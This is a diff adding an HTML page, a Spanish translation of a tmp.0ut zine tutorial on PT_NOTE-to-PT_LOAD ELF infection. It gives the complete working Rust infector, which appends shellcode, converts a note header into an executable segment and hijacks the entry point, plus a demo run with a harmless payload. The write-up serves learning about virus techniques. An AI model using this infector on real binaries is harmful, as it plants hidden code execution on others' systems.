@@ -1,0 +1,261 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+/*
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+*/
+       pre { font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<!--// Translation by @pathinthefog -->
+<center><div style="display: inline-block; text-align: left;"><pre>
+
+   \_______________________________________________________________________/
+o_/_________________________________________________________________________\_o
+   | |          ___________                              __              | |
+   | |          \__    ___/____ ______      ____  __ ___/  |_            | |
+   | |            |    | /     \\____ \    /  _ \|  |  \   __\           | |
+   | |            |    ||  Y Y  \  |_> >  (  <_> )  |  /|  |             | |
+   | |            |____||__|_|  /   __/ /\ \____/|____/ |__|             | |
+   | |                        \/|__|    \/                               | |
+   | |                                                                   | |
+   | |   ::: Inyector de ELFs PT_NOTE a PT_LOAD programado en Rust :::   | |
+   | |              `- con cariño, de d3npa y tmp.0ut <3                 | |
+   | |                                                                   | |
+
++------------------------------------------------------------------------------
+| Una versión en Japones está disponible en Github / 日本語版はGithubにてご覧できます
+| https://github.com/d3npa/hacking-trix-rust/blob/main/elf/ptnote-infector
++------------------------------------------------------------------------------
+
+En el blog SymbolCrash leí sobre una técnica para inyectar shellcode en un binario ELF mediante la conversión de una cabecera PT_NOTE a PT LOAD.
+Esto sonaba interesante y no sabía mucho acerca del formato ELF, así que lo tomé como una oportunidad para aprender muchas cosas a la vez.
+
+Para este proyecto cree una pequeña y muy incompleta librería la cual llamé mental_elf,que permite parsear y escribir metadatos ELF fácilmente. Pienso que el código de la librería es bastante sencillo y fácil de entender, así que no voy a escribir sobre ello.
+
+====[ visión general ]============================================================
+
+Como insinuá el título, esta técnica de infección implica convertir la cabecera de programa ‘PT_NOTE’ de un ELF a ‘PT_LOAD’ para poder correr shellcode.
+Esta infección esta compuesta por tres pasos:
+
+- Adjuntar el shellcode al final del archivo ELF.
+- Cargar el shellcode a una dirección especifica en memoria virtual.
+- Cambiar el punto de entrada del ELF a la dirección de memoria del paso anterior para que el shellcode sea ejecutado primero.
+
+Además, el shellcode debería ser parcheado para cada ELF de modo tal que regrese mediante un salto al punto de entrada original del ELF que sirve como host, de esta manera, permitiéndole al host ejecutar normalmente luego de que el shellcode termine de correr.
+
+El shellcode podría ser cargado a memoria virtual mediante una cabecera PT_LOAD. Insertar una nueva cabecera de programa en un archivo ELF probablemente rompería muchos offsets a lo largo del binario, sin embargo, usualmente es posible reutilizar una cabecera PT_NOTE sin romper el binario.
+
+Eh aquí un apartado sobre la Sección Nota en la especificación del formato ELF:
+
+	+----------------------------------------------------------------------------------
+	| La información de Nota es opcional. La presencia de información de Nota no
+	| afecta la conformidad ABI de un programa, siempre y cuando la información no
+	| afecte el comportamiento de ejecución del programa. Si este no fuera el caso, el
+	| programa no está en conformidad con el ABI y tiene comportamiento no definido.
+	+----------------------------------------------------------------------------------
+
+Eh aquí dos salvedades de las que me di cuenta:
+
+- Esta técnica simplista no funcionara con PIE.
+- El runtime del lenguaje Go espera una sección PT_NOTE valida que contenga información de versión para que pueda correr, así que esta técnica no puede ser usada en binarios hechos en Go.
+
+Nota: PIE puede ser desactivado en cc con ‘-no-pie’ o en rustc con ‘-C relocation-model=static’
+
+====[ shellcode ]==============================================================
+
+El shellcode provisto está escrito para el Netwide Assembler (NASM).
+¡Asegurate de instalar ‘nasm’ antes de correr el Makefile!
+
+Para crear shellcode apropiado para esta inyección, hay algunas cosas que tener en cuenta. La sección 3.4.1 del AMD64 System V ABI dice que los registros rbp, rsp y rdx deben tener asignados valores correctos antes de la entrada. Esto puede ser logrado mediante el uso común de instrucciones push y pop en el shellcode.
+
+Mi shellcode no hace uso de rbp o rsp, y asignar rdx a cero antes de retornar también funciono.
+
+Ademas, el shellcode debe ser parcheado de tal manera que puede regresar mediante un salto al punto de entrada original del host luego de terminar su ejecución. Para hacer que el parcheo sea mas fácil, el shellcode puede ser diseñado para correr mas allá del final del archivo, mediante la escritura del mismo de arriba hacia abajo, o saltando a una etiqueta vaciá al final:
+
+    +--------------------------------------------------------------------------
+    | main_tasks:
+    |    ; ...
+    |    jmp finish
+    | other_tasks:
+    |     ; ...
+    | finish:
+    +--------------------------------------------------------------------------
+
+Con este diseño, parchear es tan fácil como adjuntar una instrucción de salto.
+Sin embargo, en x86_64, jmp no puede recibir un operando de 64 bits, en cambio, el destino es almacenado en rax y la instrucción ‘jmp rax’ es utilizada. Este fragmento de rust parchea un vector de byte del shellcode dado, para adjuntar un salto a entry_point:
+
+    +--------------------------------------------------------------------------
+    | fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
+    |     // Almacenamos entry_point en rax
+    |     shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
+    |     shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    |     // Saltamos a la dirección almacenada en rax
+    |     shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+    | }
+    +--------------------------------------------------------------------------
+
+====[ infectador ]===============================================================
+
+El infectador se encuentra en src/main.rs.
+Está escrito en un formato sencillo de seguir de arriba hacia abajo, así que si entendiste la visión general entonces debería ser entendible. También agregué comentarios para ayudar.
+El código utiliza mi librería mental_elf para abstraer los detalles de lectura y escritura de archivos, para lograr que sea mas sencillo entender la técnica utilizada.
+
+En resumen, el código realiza las siguientes acciones:
+
+- Toma 2 parámetros desde consola. El ELF a inyectar y el archivo que contiene el shellcode.
+- Lee el ELF y las cabeceras de programa del archivo ELF.
+- Parchea el shellcode con un ‘jmp’ al punto de entrada original.
+- Adjunta el shellcode parcheado al ELF.
+- Encuentra una cabecera de programa ‘PT_NOTE’ y la convierte a ‘PT_LOAD’
+- Cambia el punto de entrada del ELF para que apunte al comienzo del shellcode.
+- Guarda las estructuras de cabecera modificadas en el archivo ELF.
+
+Cuando un archivo ELF infectado es ejecutado, el cargador de programas encargado de cargar el ELF, va a mapear secciones del archivo ELF en memoria virtual – el PT_LOAD que nosotros creamos se encargara de que nuestro shellcode sea cargado y ejecutado. El punto de entrada del ELF comienza la ejecución del shellcode. Luego el shellcode termina, y saltara al punto de entrada original, permitiendo al binario ejecutar su código original.
+
+    +--------------------------------------------------------------------------
+    | $ make
+    | cd files && make && cd ..
+    | make[1]: Entering directory '/.../files'
+    | rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
+    | nasm -o shellcode.o shellcode.s
+    | make[1]: Leaving directory '/.../files'
+    | cargo run --release files/target files/shellcode.o
+    | Compiling mental_elf v0.1.0
+    (https://github.com/d3npa/mental-elf#0355d2d3)
+    | Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
+    |     Finished release [optimized] target(s) in 1.15s
+    |     Running `target/release/ptnote-to-ptload-elf-injection files/target
+    files/shellcode.o`
+    | Found PT_NOTE section; converting to PT_LOAD
+    | echo 'Done! Run target with: `./files/target`'
+    | Done! Run target with: `./files/target`
+    | $ ./files/target
+    | dont tell anyone im here
+    | hello world!
+    | $
+    +--------------------------------------------------------------------------
+
+====[ conclusión ]================================================================
+
+¡Este fue un proyecto muy divertido! Aprendí muchísimo sobre Rust, ELF y los virus en general. Gracias a netspooky, sblip, TMZ y otros miembros de tmp.out por enseñarme, ayudarme a depurar y motivarme para llevar a cabo este proyecto <3.
+
+Enlaces adicionales:
+
+- https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+- http://www.skyfree.org/linux/references/ELF_Format.pdf
+- https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf
+- https://github.com/d3npa/mental-elf
+
+El código fuente esta aquí abajo:
+
+------------------------------------------------------------------------------
+  Cargo.toml
+------------------------------------------------------------------------------
+
+[package]
+...
+
+[dependencies.mental_elf]
+git = "https://github.com/d3npa/mental-elf"
+rev = "0355d2d35558e092a038589fc8b98ac9bc70c37b"
+
+------------------------------------------------------------------------------
+  main.rs
+------------------------------------------------------------------------------
+
+use mental_elf::elf64::constants::*;
+use std::{env, fs, process};
+use std::io::prelude::*;
+use std::io::SeekFrom;
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let args: Vec<String> = env::args().collect();
+    if args.len() != 3 {
+        eprintln!("Usage: {} <ELF File> <Shellcode File>", args[0]);
+        process::exit(1);
+    }
+
+    let elf_path = &args[1];
+    let sc_path = &args[2];
+
+    // Abrimos el ELF a inyectar con permisos de lectura y escritura
+    let mut elf_fd = fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(&elf_path)?;
+
+    // Cargamos el shellcode de un archivo
+    let mut shellcode: Vec<u8> = fs::read(&sc_path)?;
+
+    // Parseamos el ELF y las cabeceras de programa
+    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
+    let mut program_headers = mental_elf::read_elf64_program_headers(
+        &mut elf_fd,
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+    )?;
+
+    // Parcheamos el shellcode para saltar al punto de entrada original luego de terminar
+    patch_jump(&mut shellcode, elf_header.e_entry);
+
+    // Adjuntamos el shellcode al final del ELF a inyectar
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&shellcode)?;
+
+    // Calculamos los offsets usados para parchear el ELF y las cabeceras de programa
+    let sc_len = shellcode.len() as u64;
+    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let memory_offset = 0xc00000000 + file_offset;
+
+    // Buscamos una sección de tipo PT_NOTE
+    for phdr in &mut program_headers {
+        if phdr.p_type == PT_NOTE {
+            //  Convertimos a una seccion de tipo PT_LOAD con los valores necesarios 			//  para  cargar el shellcode
+            println!("Found PT_NOTE section; converting to PT_LOAD");
+            phdr.p_type = PT_LOAD;
+            phdr.p_flags = PF_R | PF_X;
+            phdr.p_offset = file_offset;
+            phdr.p_vaddr = memory_offset;
+            phdr.p_memsz += sc_len as u64;
+            phdr.p_filesz += sc_len as u64;
+            // Parcheamos el punto de entrada del ELF para empezar en el shellcode
+            elf_header.e_entry = memory_offset;
+            break;
+        }
+    }
+
+    // Escribimos los cambios en las cabeceras de programa del ELF
+    mental_elf::write_elf64_program_headers(
+        &mut elf_fd,
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+        program_headers,
+    )?;
+    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
+
+    Ok(())
+}
+
+fn patch_jump(shellcode: &mut Vec<u8>, entry_point: u64) {
+    // Almacenamos entry_poinit en rax
+    shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
+    shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    // Saltamos a la dirección de memoria en rax
+    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+}
+
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+</pre></div></center></body></html>
